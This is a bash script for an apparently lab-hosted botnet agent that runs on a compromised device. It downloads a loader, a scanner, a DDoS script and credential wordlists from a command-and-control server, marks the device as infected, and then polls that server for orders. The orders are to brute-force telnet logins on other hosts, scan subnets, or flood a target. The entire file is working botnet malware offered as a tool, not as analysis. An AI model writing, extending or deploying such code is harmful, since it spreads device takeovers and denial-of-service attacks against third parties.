#!/bin/bash

# this is my attempt at a super lightweight agent that doesn't need C binaries or python interpreter and dependencies

# i thought of the following structure: upon getting the credentials to a device, curl ALL of the payloads necessary: scanner, ddoser, 
# loader, whatever. then this agent simply periodically queries for the instruction on the server, executes it and reports back.
INFECTED=/tmp/infected
ID=$(cat dev_id)
if [ ! -e $INFECTED ]; then
	echo 'fetching payloads'
	curl http://172.18.0.1:8000/payload/loader?device_id="$ID" -o loader # i'm gonna get rid of this device id later, or make it some unique thing like the mac
	curl http://172.18.0.1:8000/payload/scanner?device_id="$ID" -o scanner # i'm gonna get rid of this device id later, or make it some unique thing like the mac
	curl http://172.18.0.1:8000/payload/ddos?device_id="$ID" -o dos.sh # i'm gonna get rid of this device id later, or make it some unique thing like the mac
	curl http://172.18.0.1:8000/wordlist/users?device_id="$ID" -o users.txt
	curl http://172.18.0.1:8000/wordlist/passwords?device_id="$ID" -o passwords.txt
	# curl other necessary payloads...

	chmod +x loader
	chmod +x scanner
	chmod +x dos.sh
	touch /tmp/infected # signal this device as infected with all the payloads
	curl -X POST http://172.18.0.1:8000/infected?device_id="$ID"
fi

while true; do # TODO: fix inside of loop
	curl -f http://172.18.0.1:8000/inst?device_id="$ID" -o inst
	INSTRUCTION=$(cat inst)
	echo $INSTRUCTION
	read CMD IP MASK <<< "$INSTRUCTION"
	if [[ "$CMD" == "none" ]]; then
		:
	elif [[ "$CMD" == "load" ]]; then
		curl -X POST "http://172.18.0.1:8000/busy?device_id="$ID"&busystatus=1"
		./loader "$IP" 23 users.txt passwords.txt 10
		curl -X POST "http://172.18.0.1:8000/busy?device_id="$ID"&busystatus=0"
		curl -X POST "http://172.18.0.1:8000/inst?device_id="$ID"&status=1"
	elif [[ "$CMD" == "scan" ]]; then
		curl -X POST "http://172.18.0.1:8000/busy?device_id="$ID"&busystatus=1"
		./scanner "$IP" "$MASK"
		curl -X POST "http://172.18.0.1:8000/busy?device_id="$ID"&busystatus=0"
		curl -X POST "http://172.18.0.1:8000/inst?device_id="$ID"&status=1"
	elif [[ "$CMD" == "ddos" ]]; then
		./dos.sh "$IP"
	fi
	sleep 10
done
